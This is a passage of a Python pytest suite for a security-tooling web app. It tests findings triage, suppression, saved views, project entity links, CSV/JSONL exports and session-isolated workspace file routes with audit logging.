        assert missing_triage_get_resp.status_code == 404
        assert json.loads(missing_triage_get_resp.data) == {"error": "finding not found"}
        assert missing_triage_put_resp.status_code == 404
        assert json.loads(missing_triage_put_resp.data) == {"error": "finding not found"}
        assert cross_scope_triage_get_resp.status_code == 404
        assert json.loads(cross_scope_triage_get_resp.data) == {"error": "finding not found"}
        assert cross_scope_triage_put_resp.status_code == 404
        assert json.loads(cross_scope_triage_put_resp.data) == {"error": "finding not found"}
        assert triage_get_empty_resp.status_code == 200
        assert json.loads(triage_get_empty_resp.data)["triage"]["verification_status"] == "not_started"
        assert triage_update_resp.status_code == 200
        triage_debug.assert_called_with("FINDING_TRIAGE_UPDATE_REQUESTED", extra=mock.ANY)
        triage_debug_extra = triage_debug.call_args.kwargs["extra"]
        assert triage_debug_extra["finding_id"] == finding_id
        assert triage_debug_extra["previous_verification_status"] == "not_started"
        assert triage_debug_extra["next_verification_status"] == "ready_to_verify"
        assert triage_debug_extra["will_clear"] is False
        triage_info.assert_any_call("FINDING_TRIAGE_UPDATED", extra=mock.ANY)
        triage_info_call = next(
            call for call in triage_info.call_args_list
            if call.args and call.args[0] == "FINDING_TRIAGE_UPDATED"
        )
        triage_info_extra = triage_info_call.kwargs["extra"]
        assert triage_info_extra["finding_id"] == finding_id
        assert triage_info_extra["action"] == "created"
        assert triage_info_extra["triage_id"]
        assert triage_update_miss_resp.status_code == 404
        triage_miss_warning.assert_called_with("FINDING_TRIAGE_UPDATE_MISS", extra=mock.ANY)
        assert triage_miss_warning.call_args.kwargs["extra"]["finding_id"] == finding_id
        triage = json.loads(triage_update_resp.data)["triage"]
        assert triage["remediation"] == "Patch the exposed service."
        assert triage["verification_status"] == "ready_to_verify"
        assert triage_invalid_resp.status_code == 400
        assert triage_oversized_resp.status_code == 400
        assert triage_null_resp.status_code == 400
        assert triage_malformed_resp.status_code == 400
        assert json.loads(triage_malformed_resp.data) == {"error": "finding triage payload must be JSON"}
        malformed_warning.assert_called_with("FINDING_TRIAGE_PAYLOAD_DECODE_FAILED", extra=mock.ANY)
        assert malformed_warning.call_args.kwargs["extra"]["finding_id"] == finding_id
        assert triage_empty_body_resp.status_code == 400
        triage_after_bad_payloads = json.loads(triage_after_bad_payloads_resp.data)["triage"]
        assert triage_after_bad_payloads["remediation"] == "Patch the exposed service."
        assert triage_after_bad_payloads["verification_status"] == "ready_to_verify"
        assert explicit_not_started_resp.status_code == 200
        assert filtered_resp.status_code == 200
        filtered = json.loads(filtered_resp.data)
        assert filtered["total"] == 1
        assert filtered["findings"][0]["verification_status"] == "ready_to_verify"
        assert filtered["findings"][0]["triage"]["has_remediation"] is True
        assert filtered["findings"][0]["triage"]["remediation_preview"] == "Patch the exposed service."
        assert filtered_not_started_resp.status_code == 200
        filtered_not_started = json.loads(filtered_not_started_resp.data)
        assert filtered_not_started["total"] == 2
        filtered_not_started_by_id = {
            item["id"]: item for item in filtered_not_started["findings"]
        }
        assert set(filtered_not_started_by_id) == {no_triage_finding_id, explicit_not_started_finding_id}
        assert filtered_not_started_by_id[no_triage_finding_id]["verification_status"] == "not_started"
        assert filtered_not_started_by_id[no_triage_finding_id]["triage"]["has_remediation"] is False
        assert filtered_not_started_by_id[explicit_not_started_finding_id]["verification_status"] == "not_started"
        assert filtered_not_started_by_id[explicit_not_started_finding_id]["triage"]["has_remediation"] is True
        assert (
            filtered_not_started_by_id[explicit_not_started_finding_id]["triage"]["remediation_preview"]
            == "Keep this queued for later verification."
        )
        assert json.loads(filtered_empty_resp.data)["total"] == 0
        assert filtered_invalid_resp.status_code == 400
        with db_connect() as conn:
            row = conn.execute(
                "SELECT status FROM findings WHERE session_id = ? AND id = ?",
                (session_id, finding_id),
            ).fetchone()
        assert row["status"] == "important"

    def test_atlas_suppression_hides_rows_until_requested_and_preserves_project_links(self):
        client = get_client()
        session_id = self._session_id()
        _, recorded = self._seed_entity_run(session_id)
        domain_id = next(item["id"] for item in recorded if item["type"] == "domain")
        finding_id = json.loads(client.get("/atlas/findings", headers={"X-Session-ID": session_id}).data)["findings"][0]["id"]
        project_resp = client.post(
            "/projects",
            json={"name": "Suppression Case"},
            headers={"X-Session-ID": session_id},
        )
        project = json.loads(project_resp.data)["project"]
        client.post(
            f"/projects/{project['id']}/links",
            json={"entity_type": "atlas_entity", "entity_id": domain_id},
            headers={"X-Session-ID": session_id},
        )

        entity_suppress_resp = client.put(
            f"/atlas/entities/{domain_id}/suppression",
            json={"suppressed": True, "reason": "too noisy"},
            headers={"X-Session-ID": session_id},
        )
        finding_suppress_resp = client.put(
            f"/atlas/findings/{finding_id}/suppression",
            json={"suppressed": True},
            headers={"X-Session-ID": session_id},
        )
        default_summary = client.get("/atlas", headers={"X-Session-ID": session_id})
        suppressed_entities = client.get(
            "/atlas/entities?type=domain&suppression_filter=only",
            headers={"X-Session-ID": session_id},
        )
        suppressed_findings = client.get(
            "/atlas/findings?suppression_filter=only",
            headers={"X-Session-ID": session_id},
        )
        default_export = client.get(
            "/atlas/entities/export?format=jsonl&type=domain",
            headers={"X-Session-ID": session_id},
        )
        suppressed_export = client.get(
            "/atlas/entities/export?format=jsonl&type=domain&suppression_filter=only",
            headers={"X-Session-ID": session_id},
        )
        project_summary = client.get(f"/projects/{project['id']}/summary", headers={"X-Session-ID": session_id})
        restore_resp = client.post(
            "/atlas/findings/suppression",
            json={"finding_ids": [finding_id], "suppressed": False},
            headers={"X-Session-ID": session_id},
        )

        assert entity_suppress_resp.status_code == 200
        assert finding_suppress_resp.status_code == 200
        assert json.loads(default_summary.data)["counts"]["domain"] == 0
        assert json.loads(default_summary.data)["findings"] == 0
        entity_data = json.loads(suppressed_entities.data)
        assert entity_data["total"] == 1
        assert entity_data["entities"][0]["suppressed"] is True
        assert entity_data["entities"][0]["suppressed_reason"] == "too noisy"
        finding_data = json.loads(suppressed_findings.data)
        assert finding_data["total"] == 1
        assert finding_data["findings"][0]["suppressed"] is True
        assert default_export.data.decode("utf-8") == ""
        exported = [json.loads(line) for line in suppressed_export.data.decode("utf-8").splitlines()]
        assert exported[0]["suppressed"] is True
        assert json.loads(project_summary.data)["counts"]["entities"] == 0
        assert restore_resp.status_code == 200
        assert json.loads(restore_resp.data)["counts"] == {"updated": 1, "not_found": 0}
        entity_suppress_events = _audit_event_rows(target_id=domain_id, event_type="entity.suppress")
        assert len(entity_suppress_events) == 1
        assert entity_suppress_events[0]["target_type"] == "entity"
        assert entity_suppress_events[0]["details"]["suppressed"] is True
        assert entity_suppress_events[0]["details"]["reason"] == "too noisy"

    def test_atlas_saved_views_roundtrip_and_stay_session_scoped(self):
        client = get_client()
        session_id = self._session_id()
        other_session_id = self._session_id()

        create_resp = client.post(
            "/atlas/views",
            json={
                "name": "High signal",
                "tab": "findings",
                "filters": {
                    "query": "ssl",
                    "orphan_filter": "only",
                    "suppression_filter": "only",
                    "finding_status": "important",
                    "project_id": "prj_0123456789abcdef",
                    "project_name": "External Test",
                    "run_id": "run_0123456789abcdef",
                    "run_label": "katana -u https://darklab.sh",
                    "signals": ["findings", "findings"],
                    "kinds": ["error"],
                    "exclude_kinds": ["info"],
                    "roles": ["body"],
                    "entities": ["darklab.sh"],
                    "entity_types": ["domain"],
                },
            },
            headers={"X-Session-ID": session_id},
        )
        view = json.loads(create_resp.data)["view"]
        list_resp = client.get("/atlas/views", headers={"X-Session-ID": session_id})
        isolated_resp = client.get("/atlas/views", headers={"X-Session-ID": other_session_id})
        preferences_resp = client.post(
            "/session/preferences",
            json={"preferences": {"pref_timestamps": "on"}},
            headers={"X-Session-ID": session_id},
        )
        after_preferences_resp = client.get("/atlas/views", headers={"X-Session-ID": session_id})
        update_resp = client.put(
            f"/atlas/views/{view['id']}",
            json={
                "name": "Reviewed SSL",
                "tab": "domain",
                "filters": {
                    "query": "darklab",
                    "orphan_filter": "hide",
                    "suppression_filter": "all",
                    "finding_status": "reviewed",
                },
            },
            headers={"X-Session-ID": session_id},
        )
        delete_resp = client.delete(f"/atlas/views/{view['id']}", headers={"X-Session-ID": session_id})
        after_delete_resp = client.get("/atlas/views", headers={"X-Session-ID": session_id})

        assert create_resp.status_code == 201
        assert view["name"] == "High signal"
        assert view["tab"] == "findings"
        assert view["filters"]["query"] == "ssl"
        assert view["filters"]["finding_status"] == "important"
        assert view["filters"]["run_id"] == "run_0123456789abcdef"
        assert view["filters"]["run_label"] == "katana -u https://darklab.sh"
        assert view["filters"]["signals"] == ["findings"]
        assert view["filters"]["exclude_kinds"] == ["info"]
        assert view["filters"]["entity_types"] == ["domain"]
        assert json.loads(list_resp.data)["views"][0]["id"] == view["id"]
        assert json.loads(isolated_resp.data)["views"] == []
        assert preferences_resp.status_code == 200
        assert json.loads(after_preferences_resp.data)["views"][0]["id"] == view["id"]
        assert update_resp.status_code == 200
        updated = json.loads(update_resp.data)["view"]
        assert updated["name"] == "Reviewed SSL"
        assert updated["tab"] == "domain"
        assert updated["filters"]["suppression_filter"] == "all"
        assert delete_resp.status_code == 200
        assert json.loads(after_delete_resp.data)["views"] == []

    def test_unscoped_findings_flow_through_atlas_projects_and_run_routes(self):
        client = get_client()
        session_id = self._session_id()
        run_id = "run-" + uuid.uuid4().hex
        project_resp = client.post(
            "/projects",
            json={"name": "Unscoped Finding Case"},
            headers={"X-Session-ID": session_id},
        )
        project = json.loads(project_resp.data)["project"]
        with db_connect() as conn:
            conn.execute(
                "INSERT INTO runs (id, session_id, run_kind, command, started, output_preview, output_line_count) "
                "VALUES (?, ?, 'external', ?, ?, ?, 1)",
                (run_id, session_id, "sslscan darklab.sh", "2026-05-14T00:00:00+00:00", "[]"),
            )
            conn.commit()
        client.post(
            f"/projects/{project['id']}/links",
            json={"entity_type": "run", "entity_id": run_id},
            headers={"X-Session-ID": session_id},
        )
        with db_connect() as conn:
            recorded = record_run_findings(conn, session_id, run_id, [{
                "text": "TLSv1.0 enabled [high]",
                "signals": ["findings"],
                "line_index": 7,
            }])
            conn.commit()

        atlas_resp = client.get("/atlas/findings?review_state=new", headers={"X-Session-ID": session_id})
        project_findings_resp = client.get(
            f"/projects/{project['id']}/findings",
            headers={"X-Session-ID": session_id},
        )
        run_findings_resp = client.get(f"/entities/run/{run_id}/findings", headers={"X-Session-ID": session_id})
        finding = json.loads(atlas_resp.data)["findings"][0]
        review_resp = client.put(
            f"/findings/{finding['id']}/review",
            json={"review_state": "needs_followup"},
            headers={"X-Session-ID": session_id},
        )
        triage_resp = client.put(
            f"/findings/{finding['id']}/triage",
            json={
                "verification_status": "verified",
                "verification_steps": "Confirm TLSv1.0 is disabled.",
            },
            headers={"X-Session-ID": session_id},
        )
        updated_project_findings_resp = client.get(
            f"/projects/{project['id']}/findings",
            headers={"X-Session-ID": session_id},
        )
        verified_project_findings_resp = client.get(
            f"/projects/{project['id']}/findings?verification_status=verified",
            headers={"X-Session-ID": session_id},
        )
        wrong_verification_project_findings_resp = client.get(
            f"/projects/{project['id']}/findings?verification_status=needs_retest",
            headers={"X-Session-ID": session_id},
        )

        assert len(recorded) == 1
        assert recorded[0]["entity_id"] == ""
        assert recorded[0]["target_ids"] == []
        expected_finding_keys = {
            "id",
            "session_id",
            "run_id",
            "target_id",
            "entity_id",
            "subject_key",
            "scope",
            "kind",
            "title",
            "raw_line",
            "line_number",
            "severity",
            "fingerprint",
            "review_state",
            "status",
            "first_seen_at",
            "last_seen_at",
            "occurrence_count",
            "created",
        }
        assert expected_finding_keys.issubset(recorded[0])
        assert atlas_resp.status_code == 200
        assert finding["entity_id"] == ""
        assert finding["entity_value"] == ""
        assert finding["subject_key"].startswith("unscoped:sslscan:")
        assert project_findings_resp.status_code == 200
        project_findings = json.loads(project_findings_resp.data)["findings"]
        assert [(item["id"], item["target_ids"]) for item in project_findings] == [(finding["id"], [])]
        assert expected_finding_keys.issubset(project_findings[0])
        assert run_findings_resp.status_code == 200
        run_findings = json.loads(run_findings_resp.data)["findings"]
        assert [(item["id"], item["target_ids"]) for item in run_findings] == [(finding["id"], [])]
        assert expected_finding_keys.issubset(run_findings[0])
        assert review_resp.status_code == 200
        reviewed_finding = json.loads(review_resp.data)["finding"]
        assert reviewed_finding["review_state"] == "needs_followup"
        assert reviewed_finding["status"] == "needs_followup"
        assert expected_finding_keys.issubset(reviewed_finding)
        assert triage_resp.status_code == 200
        updated_project_finding = json.loads(updated_project_findings_resp.data)["findings"][0]
        assert updated_project_finding["review_state"] == "needs_followup"
        assert updated_project_finding["verification_status"] == "verified"
        assert updated_project_finding["triage"]["has_verification_steps"] is True
        assert json.loads(verified_project_findings_resp.data)["findings"][0]["id"] == finding["id"]
        assert json.loads(wrong_verification_project_findings_resp.data)["findings"] == []

    def test_run_findings_route_returns_deduped_findings_with_occurrence_count(self):
        client = get_client()
        session_id = self._session_id()
        run_id = "run-" + uuid.uuid4().hex
        with db_connect() as conn:
            conn.execute(
                "INSERT INTO runs (id, session_id, run_kind, command, started, output_preview, output_line_count) "
                "VALUES (?, ?, 'external', ?, ?, ?, 2)",
                (run_id, session_id, "katana -u https://darklab.sh", "2026-05-14T00:00:00+00:00", "[]"),
            )
            recorded = record_run_findings(conn, session_id, run_id, [
                {"text": "https://darklab.sh/login [200]", "signals": ["findings"], "line_index": 0},
                {"text": "https://darklab.sh/login [200]", "signals": ["findings"], "line_index": 9},
            ])
            occurrence_count = conn.execute(
                "SELECT COUNT(*) FROM findings_occurrences WHERE run_id = ?",
                (run_id,),
            ).fetchone()[0]
            conn.commit()

        resp = client.get(f"/entities/run/{run_id}/findings", headers={"X-Session-ID": session_id})
        findings = json.loads(resp.data)["findings"]

        assert resp.status_code == 200
        assert len(recorded) == 2
        assert occurrence_count == 2
        assert len(findings) == 1
        assert findings[0]["run_occurrence_count"] == 2
        assert findings[0]["line_number"] == 0

        paged_resp = client.get(
            f"/entities/run/{run_id}/findings?limit=1&offset=0",
            headers={"X-Session-ID": session_id},
        )
        paged = json.loads(paged_resp.data)

        assert paged_resp.status_code == 200
        assert len(paged["findings"]) == 1
        assert paged["total"] == 1
        assert paged["limit"] == 1
        assert paged["offset"] == 0
        assert paged["has_more"] is False
        assert paged["occurrence_total"] == 2

    def test_project_links_curate_atlas_entities_into_project_targets(self):
        client = get_client()
        session_id = self._session_id()
        _, recorded = self._seed_entity_run(session_id)
        domain_id = next(item["id"] for item in recorded if item["type"] == "domain")
        project_resp = client.post(
            "/projects",
            json={"name": "Atlas Case"},
            headers={"X-Session-ID": session_id},
        )
        project = json.loads(project_resp.data)["project"]

        link_resp = client.post(
            f"/atlas/entities/{domain_id}/project_links",
            json={"project_id": project["id"]},
            headers={"X-Session-ID": session_id},
        )
        targets_resp = client.get(
            f"/projects/{project['id']}/targets",
            headers={"X-Session-ID": session_id},
        )
        summary_resp = client.get(
            f"/projects/{project['id']}/summary",
            headers={"X-Session-ID": session_id},
        )
        unlink_resp = client.delete(
            f"/atlas/entities/{domain_id}/project_links/{project['id']}",
            headers={"X-Session-ID": session_id},
        )
        targets_after_unlink = client.get(
            f"/projects/{project['id']}/targets",
            headers={"X-Session-ID": session_id},
        )

        assert link_resp.status_code == 201
        assert json.loads(link_resp.data)["link"]["entity_type"] == "atlas_entity"
        assert targets_resp.status_code == 200
        targets = json.loads(targets_resp.data)["targets"]
        assert [(item["id"], item["value"]) for item in targets] == [(domain_id, "darklab.sh")]
        assert json.loads(summary_resp.data)["counts"]["targets"] == 1
        assert unlink_resp.status_code == 200
        assert json.loads(targets_after_unlink.data)["targets"] == []

    def test_project_summary_surfaces_all_linked_atlas_entities(self):
        client = get_client()
        session_id = self._session_id()
        run_id, recorded = self._seed_entity_run(session_id)
        other_run_id, other_recorded = self._seed_domain_finding_run(session_id, "unrelated.test")
        domain_id = next(item["id"] for item in recorded if item["type"] == "domain")
        cve_id = next(item["id"] for item in recorded if item["type"] == "cve")
        other_domain_id = next(item["id"] for item in other_recorded if item["type"] == "domain")
        project_resp = client.post(
            "/projects",
            json={"name": "Entity Case"},
            headers={"X-Session-ID": session_id},
        )
        project = json.loads(project_resp.data)["project"]
        with db_connect() as conn:
            conn.execute(
                "INSERT INTO entity_intel_snapshots "
                "(id, session_id, entity_id, provider, status, summary, data_json, fetched_at) "
                "VALUES (?, ?, ?, 'nvd', 'ok', 'data available', ?, datetime('now'))",
                (
                    "intel_" + uuid.uuid4().hex,
                    session_id,
                    cve_id,
                    json.dumps({"summary": {"has_intel": True, "providers_with_data": ["nvd"]}}),
                ),
            )
            conn.commit()

        bulk_resp = client.post(
            f"/projects/{project['id']}/links",
            json={"entity_type": "atlas_entity", "entity_ids": [domain_id, cve_id, other_domain_id]},
            headers={"X-Session-ID": session_id},
        )
        for linked_run_id in (run_id, other_run_id):
            client.post(
                f"/projects/{project['id']}/links",
                json={"entity_type": "run", "entity_id": linked_run_id},
                headers={"X-Session-ID": session_id},
            )
        summary_resp = client.get(
            f"/projects/{project['id']}/summary",
            headers={"X-Session-ID": session_id},
        )
        entities_resp = client.get(
            f"/projects/{project['id']}/entities?type=cve&limit=1&offset=0",
            headers={"X-Session-ID": session_id},
        )
        run_filtered_resp = client.get(
            f"/projects/{project['id']}/entities?run_id={run_id}&limit=10&offset=0",
            headers={"X-Session-ID": session_id},
        )
        target_filtered_resp = client.get(
            f"/projects/{project['id']}/entities?target_id={domain_id}&limit=10&offset=0",
            headers={"X-Session-ID": session_id},
        )
        data = json.loads(summary_resp.data)
        entity_page = json.loads(entities_resp.data)
        run_filtered = json.loads(run_filtered_resp.data)
        target_filtered = json.loads(target_filtered_resp.data)

        assert bulk_resp.status_code == 200
        assert json.loads(bulk_resp.data)["counts"]["added"] == 3
        assert summary_resp.status_code == 200
        assert entities_resp.status_code == 200
        assert run_filtered_resp.status_code == 200
        assert target_filtered_resp.status_code == 200
        assert data["counts"]["targets"] == 2
        assert data["counts"]["entities"] == 3
        assert data["entities"] == []
        assert data["entity_counts"]["domain"] == 2
        assert data["entity_counts"]["cve"] == 1
        assert {item["id"] for item in data["targets"]} == {domain_id, other_domain_id}
        assert entity_page["total"] == 1
        assert entity_page["limit"] == 1
        assert entity_page["counts_by_type"]["domain"] == 2
        assert entity_page["counts_by_type"]["cve"] == 1
        entities = {item["id"]: item for item in entity_page["entities"]}
        assert set(entities) == {cve_id}
        assert entities[cve_id]["type"] == "cve"
        assert entities[cve_id]["intel_provider_count"] == 1
        assert entities[cve_id]["intel_providers"] == ["nvd"]
        assert entities[cve_id]["intel_last_refreshed"]
        assert {item["id"] for item in run_filtered["entities"]} == {domain_id, cve_id}
        assert run_filtered["counts_by_type"] == {"cve": 1, "domain": 1}
        assert {item["id"] for item in target_filtered["entities"]} == {domain_id, cve_id}
        assert target_filtered["counts_by_type"] == {"cve": 1, "domain": 1}

    def test_project_findings_include_linked_entity_findings_without_linked_run(self):
        client = get_client()
        session_id = self._session_id()
        _, recorded = self._seed_entity_run(session_id)
        domain_id = next(item["id"] for item in recorded if item["type"] == "domain")
        project_resp = client.post(
            "/projects",
            json={"name": "Entity Finding Case"},
            headers={"X-Session-ID": session_id},
        )
        project = json.loads(project_resp.data)["project"]
        link_resp = client.post(
            f"/projects/{project['id']}/links",
            json={"entity_type": "atlas_entity", "entity_id": domain_id},
            headers={"X-Session-ID": session_id},
        )
        project_findings_resp = client.get(
            f"/projects/{project['id']}/findings",
            headers={"X-Session-ID": session_id},
        )
        data = json.loads(project_findings_resp.data)

        assert link_resp.status_code == 201
        assert project_findings_resp.status_code == 200
        assert [(item["entity_id"], item["raw_line"]) for item in data["findings"]] == [
            (domain_id, "443/tcp open https on darklab.sh")
        ]
        assert data["findings"][0]["orphan_source"] is False

    def test_bulk_project_unlink_supports_atlas_entities(self):
        client = get_client()
        session_id = self._session_id()
        _, recorded = self._seed_entity_run(session_id)
        domain_id = next(item["id"] for item in recorded if item["type"] == "domain")
        cve_id = next(item["id"] for item in recorded if item["type"] == "cve")
        project_resp = client.post(
            "/projects",
            json={"name": "Bulk Entity Case"},
            headers={"X-Session-ID": session_id},
        )
        project = json.loads(project_resp.data)["project"]
        client.post(
            f"/projects/{project['id']}/links",
            json={"entity_type": "atlas_entity", "entity_ids": [domain_id, cve_id]},
            headers={"X-Session-ID": session_id},
        )

        unlink_resp = client.delete(
            f"/projects/{project['id']}/links",
            json={"entity_type": "atlas_entity", "entity_ids": [domain_id, "missing-entity"]},
            headers={"X-Session-ID": session_id},
        )
        summary_resp = client.get(
            f"/projects/{project['id']}/summary",
            headers={"X-Session-ID": session_id},
        )
        entities_resp = client.get(
            f"/projects/{project['id']}/entities?limit=10&offset=0",
            headers={"X-Session-ID": session_id},
        )
        data = json.loads(unlink_resp.data)

        assert unlink_resp.status_code == 200
        assert data["counts"]["removed"] == 1
        assert data["counts"]["not_found"] == 1
        assert {item["status"] for item in data["results"]} == {"removed", "not_found"}
        assert json.loads(summary_resp.data)["entities"] == []
        assert {item["id"] for item in json.loads(entities_resp.data)["entities"]} == {cve_id}

    def test_exports_entities_as_csv_and_jsonl_with_metadata(self):
        client = get_client()
        session_id = self._session_id()
        _, recorded = self._seed_entity_run(session_id)
        domain_id = next(item["id"] for item in recorded if item["type"] == "domain")
        project_resp = client.post(
            "/projects",
            json={"name": "Atlas Export"},
            headers={"X-Session-ID": session_id},
        )
        project = json.loads(project_resp.data)["project"]
        client.post(
            f"/atlas/entities/{domain_id}/project_links",
            json={"project_id": project["id"]},
            headers={"X-Session-ID": session_id},
        )
        with db_connect() as conn:
            conn.execute(
                "INSERT INTO entity_labels "
                "(id, session_id, entity_type, entity_id, label, created) "
                "VALUES (?, ?, 'atlas_entity', ?, 'primary', datetime('now'))",
                ("lbl_" + uuid.uuid4().hex, session_id, domain_id),
            )
            conn.execute(
                "INSERT INTO entity_notes "
                "(id, session_id, entity_type, entity_id, body, created, updated) "
                "VALUES (?, ?, 'atlas_entity', ?, 'Scope approved', datetime('now'), datetime('now'))",
                ("note_" + uuid.uuid4().hex, session_id, domain_id),
            )
            conn.execute(
                "INSERT INTO entity_intel_snapshots "
                "(id, session_id, entity_id, provider, status, summary, data_json, fetched_at) "
                "VALUES (?, ?, ?, 'crtsh', 'ok', 'data available', ?, datetime('now'))",
                (
                    "intel_" + uuid.uuid4().hex,
                    session_id,
                    domain_id,
                    json.dumps({"summary": {"has_intel": True, "providers_with_data": ["crtsh"]}}),
                ),
            )
            conn.commit()

        csv_resp = client.get(
            f"/atlas/entities/export?format=csv&type=domain&project_id={quote(project['id'])}",
            headers={"X-Session-ID": session_id},
        )
        jsonl_resp = client.get(
            f"/atlas/entities/export?format=jsonl&type=domain&project_id={quote(project['id'])}",
            headers={"X-Session-ID": session_id},
        )
        invalid_resp = client.get(
            "/atlas/entities/export?format=xml",
            headers={"X-Session-ID": session_id},
        )

        assert csv_resp.status_code == 200
        assert csv_resp.mimetype == "text/csv"
        assert "darklab-atlas-entities.csv" in csv_resp.headers["Content-Disposition"]
        rows = list(csv.DictReader(io.StringIO(csv_resp.get_data(as_text=True))))
        assert len(rows) == 1
        assert rows[0]["id"] == domain_id
        assert rows[0]["type"] == "domain"
        assert rows[0]["canonical_value"] == "darklab.sh"
        assert rows[0]["labels"] == "primary"
        assert rows[0]["notes"] == "Scope approved"
        assert rows[0]["project_names"] == "Atlas Export"
        assert rows[0]["intel_providers_with_data"] == "crtsh"
        assert jsonl_resp.status_code == 200
        assert jsonl_resp.mimetype == "application/x-ndjson"
        exported = json.loads(jsonl_resp.get_data(as_text=True).splitlines()[0])
        assert exported["labels"] == ["primary"]
        assert exported["notes"] == "Scope approved"
        assert exported["project_names"] == ["Atlas Export"]
        assert exported["intel_providers_with_data"] == ["crtsh"]
        assert invalid_resp.status_code == 400


# ── /workspace/files ──────────────────────────────────────────────────────────

class TestWorkspaceRoutes:
    def _cfg(self, root, **overrides):
        cfg = {
            "workspace_enabled": True,
            "workspace_backend": "tmpfs",
            "workspace_root": str(root),
            "workspace_quota_mb": 1,
            "workspace_max_file_mb": 1,
            "workspace_max_files": 10,
            "workspace_inactivity_ttl_hours": 1,
        }
        cfg.update(overrides)
        return cfg

    def test_requires_active_session_header(self):
        client = get_client()
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
            resp = client.get("/workspace/files")
        assert resp.status_code == 400
        assert json.loads(resp.data)["error"] == "Files require an active session"

    def test_disabled_workspace_returns_403(self):
        client = get_client()
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(
            config.CFG,
            self._cfg(tmp, workspace_enabled=False),
        ):
            resp = client.get("/workspace/files", headers={"X-Session-ID": "workspace-disabled"})
        assert resp.status_code == 403
        assert json.loads(resp.data)["error"] == "Files are disabled on this instance"

    def test_write_list_read_delete_lifecycle(self):
        client = get_client()
        session = "workspace-lifecycle-" + uuid.uuid4().hex[:8]
        file_path = f"{session}.txt"
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
            created = client.post(
                "/workspace/files",
                headers={"X-Session-ID": session},
                json={"path": file_path, "text": "darklab.sh\n"},
            )
            assert created.status_code == 200
            created_data = json.loads(created.data)
            assert created_data["file"] == {"path": file_path, "size": 11}
            assert created_data["workspace"]["usage"]["bytes_used"] == 11

            listed = json.loads(client.get("/workspace/files", headers={"X-Session-ID": session}).data)
            assert listed["files"][0]["path"] == file_path
            assert listed["limits"]["max_files"] == 10

            read = client.get(
                f"/workspace/files/read?path={file_path}",
                headers={"X-Session-ID": session},
            )
            assert json.loads(read.data) == {
                "path": file_path,
                "text": "darklab.sh\n",
                "size": 11,
            }

            binary_path = resolve_workspace_path(session, "asset.db", config.CFG, ensure_parent=True)
            binary_path.write_bytes(b"SQLite format 3\x00binary")
            binary = client.get(
                "/workspace/files/read?path=asset.db",
                headers={"X-Session-ID": session},
            )
            assert binary.status_code == 415
            assert "download it instead" in json.loads(binary.data)["error"]

            with mock.patch("services.workspace.files.os.open", side_effect=PermissionError(errno.EACCES, "denied")):
                unreadable = client.get(
                    f"/workspace/files/read?path={file_path}",
                    headers={"X-Session-ID": session},
                )
            assert unreadable.status_code == 403
            assert json.loads(unreadable.data)["error"] == "workspace file is not readable"

            deleted = client.delete(
                f"/workspace/files?path={file_path}",
                headers={"X-Session-ID": session},
            )
            assert deleted.status_code == 200
            deleted_files = json.loads(deleted.data)["workspace"]["files"]
            assert file_path not in {item["path"] for item in deleted_files}
            audit_rows = _audit_event_rows(target_id=file_path)
            assert [row["event_type"] for row in audit_rows] == ["file.write", "file.delete"]
            assert [row["target_type"] for row in audit_rows] == ["file", "file"]
            assert audit_rows[0]["details"] == {
                "source": "workspace",
                "action": "write",
                "file_path": file_path,
                "byte_size": 11,
                "file_count": 1,
                "status": "file",
            }
            assert audit_rows[1]["details"] == {
                "source": "workspace",
                "file_path": file_path,
                "file_count": 1,
                "status": "file",
            }
            assert "darklab.sh" not in json.dumps(audit_rows)

            class FailingAuditConnection:
                def execute(self, sql, params=()):
                    raise RuntimeError("audit insert failed")

                def commit(self):
                    raise AssertionError("best-effort audit failure should not commit")

            class ManagedAuditFailure:
                def __init__(self, conn=None):
                    self.conn = conn

                def __enter__(self):
                    return FailingAuditConnection(), True

                def __exit__(self, exc_type, exc, tb):
                    return False

            best_effort_path = f"{session}-audit-failure.txt"
            with mock.patch(
                "services.audit.recorder._managed_connection",
                side_effect=ManagedAuditFailure,
            ), mock.patch("services.audit.recorder.log.warning") as warning:
                best_effort_write = client.post(
                    "/workspace/files",
                    headers={"X-Session-ID": session},
                    json={"path": best_effort_path, "text": "persisted despite audit failure\n"},
                )

            assert best_effort_write.status_code == 200
            best_effort_read = client.get(
                f"/workspace/files/read?path={best_effort_path}",
                headers={"X-Session-ID": session},
            )
            assert best_effort_read.status_code == 200
            assert json.loads(best_effort_read.data)["text"] == "persisted despite audit failure\n"
            warning.assert_called_once()
            assert warning.call_args.args == ("AUDIT_EVENT_RECORD_FAILED",)
            warning_extra = warning.call_args.kwargs["extra"]
            assert warning_extra["event_type"] == "file.write"
            assert warning_extra["target_type"] == "file"
            assert warning_extra["target_id"] == best_effort_path
            assert warning_extra["recording_mode"] == "best_effort"
            assert warning_extra["details"] == {
                "source": "workspace",
                "action": "write",
                "file_path": best_effort_path,
                "byte_size": 32,
                "file_count": 1,
                "status": "file",
            }
            assert "persisted despite audit failure" not in json.dumps(warning_extra)
            assert _audit_event_rows(target_id=best_effort_path, event_type="file.write") == []

    def test_workspace_delete_records_fail_closed_audit_before_deleting_file(self):
        from services.audit.recorder import AuditRecordError

        client = get_client()
        session = "workspace-delete-audit-" + uuid.uuid4().hex[:8]
        file_path = f"{session}.txt"
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
            created = client.post(
                "/workspace/files",
                headers={"X-Session-ID": session},
                json={"path": file_path, "text": "darklab.sh\n"},
            )
            assert created.status_code == 200

            with mock.patch(
                "blueprints.workspace.record_event",
                side_effect=AuditRecordError("audit unavailable"),
            ), pytest.raises(AuditRecordError):
                client.delete(
                    f"/workspace/files?path={file_path}",
                    headers={"X-Session-ID": session},
                )

            read = client.get(
                f"/workspace/files/read?path={file_path}",
                headers={"X-Session-ID": session},
            )
            assert read.status_code == 200
            assert json.loads(read.data)["text"] == "darklab.sh\n"
            assert _audit_event_rows(target_id=file_path, event_type="file.delete") == []

    def test_workspace_files_are_session_isolated(self):
        client = get_client()
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
            resp = client.post(
                "/workspace/files",
                headers={"X-Session-ID": "workspace-owner"},
                json={"path": "targets.txt", "text": "owned\n"},
            )
            assert resp.status_code == 200

            other = client.get(
                "/workspace/files/read?path=targets.txt",
                headers={"X-Session-ID": "workspace-other"},
            )
            assert other.status_code == 404

